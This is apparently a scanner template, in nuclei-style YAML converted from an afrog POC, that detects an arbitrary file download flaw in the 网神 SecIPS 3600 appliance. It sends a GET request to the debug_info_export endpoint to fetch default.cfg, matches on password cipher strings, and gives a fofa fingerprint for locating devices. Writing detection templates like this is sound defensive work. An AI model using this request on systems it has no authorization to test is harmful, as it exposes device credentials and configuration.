# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - user audit type
          - password cipher
        condition: and
    method: GET
    path:
      - '{{BaseURL}}/webui/debug/debug_info_export?filename=default.cfg'
id: secworld-secips-3600-debuginfo-fileread
info:
  author: zan8in
  description: |
    网神 SecIPS 3600 debug_info_export接口存在任意文件下载漏洞，攻击者通过漏洞可以获取服务器敏感文件
    fofa: app="网神-SecIPS"
  metadata:
    argus-execution-class: detection
    argus-import-license: MIT License
    argus-import-source: afrog
    argus-risk-level: high
  name: 网神 SecIPS 3600 debug_info_export 任意文件下载
  severity: high
  tags: secworld,secips,3600,debuginfo,fileread,argus-import
